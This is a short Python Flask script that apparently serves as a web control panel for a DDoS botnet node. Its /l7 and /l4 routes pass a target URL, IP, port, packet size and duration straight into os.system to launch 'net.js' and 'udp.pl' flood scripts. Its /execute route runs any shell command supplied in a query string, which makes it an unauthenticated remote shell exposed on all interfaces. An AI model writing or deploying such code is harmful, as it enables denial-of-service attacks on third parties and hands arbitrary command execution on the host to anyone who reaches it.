from flask import Flask, request, send_file
import os

app = Flask('app')


@app.route('/')
def hello_world():
  return 'pong'


@app.route('/l7')
def lol():
  uri = request.args['target']
  time = request.args['time']
  os.system(f'node net.js {uri} {time}')
  return 'Target:' + uri + '<br>Time:' + time

@app.route('/l4')
def layerfour():
      ip = request.args['ip']
      port = request.args['port']
      size = request.args['size']
      time = request.args['time']
      os.system(f'perl udp.pl {ip} {port} {size} {time}')
      return 'hit ' + ip + ':' + port + ' with the packetsize of' + size + ' and going on for ' + time

      
@app.route('/execute')
def SHEXECUTE():
 EXECUTE = request.args['command']
 os.system(f'{EXECUTE}')
 return 'working'
app.run(host='0.0.0.0', port=4200)
